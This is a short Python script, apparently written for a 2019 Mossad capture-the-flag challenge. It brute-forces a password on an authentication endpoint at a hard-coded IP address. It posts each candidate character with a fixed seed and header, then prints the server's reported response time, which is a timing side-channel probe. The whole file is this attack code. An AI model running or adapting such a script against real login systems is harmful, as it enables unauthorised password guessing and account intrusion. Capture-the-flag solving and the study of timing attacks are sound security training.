# --------------------------------------------------------
# Program by ADV-IT
#  POST Requests Brute Force for Mossad Challenge#1 2019
#
# Version      Date           Info
# 1.0          11-May-2019    Initial Version
#
# -------------------------------------------------------

import requests

CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|\/?,.<>`~"
URL    = "http://35.246.158.51:8070/auth/v1_1"
HEADER = {'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b'}

for i in range(len(CHARACTERS)):
    JSONPAYLOAD = {"Seed": "6711d2ec0d724396ad1570fcfb431443", "Password": CHARACTERS[i]}
    r = requests.post(url=URL, data=JSONPAYLOAD, headers=HEADER)
    result = r.json()
    delay = result['Time']
    print(CHARACTERS[i] + " - " + str(delay))

